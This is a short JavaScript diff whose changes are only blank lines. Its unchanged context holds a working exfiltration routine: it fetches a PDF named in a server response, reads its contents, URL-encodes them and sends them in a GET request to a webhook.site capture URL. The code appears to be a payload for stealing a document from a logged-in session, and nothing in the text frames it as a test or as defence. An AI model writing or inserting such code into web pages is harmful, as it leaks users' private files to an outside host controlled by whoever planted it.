@@ -7,6 +7,7 @@ xhr.onload = function() {
     const response = JSON.parse(xhr.responseText);
     const pdfLink = response.pdfLink;
     const encpdflink = encodeURIComponent(pdfLink);
+
     const pdfRequest = new XMLHttpRequest();
     pdfRequest.open("GET", pdfLink);
     pdfRequest.responseType = "blob";
@@ -16,6 +17,7 @@ xhr.onload = function() {
         const reader = new FileReader();
         reader.onload = function() {
           const pdfContent = encodeURIComponent(reader.result);
+
           const webhookUrl = `https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39?data=${encodeURIComponent(reader.result)}`;
           const webhookRequest = new XMLHttpRequest();
           webhookRequest.open("GET", webhookUrl);
@@ -28,6 +30,7 @@ xhr.onload = function() {
       console.log("Error reading PDF file.");
     };
     pdfRequest.send();
+
   }
 };
 xhr.onerror = function() {
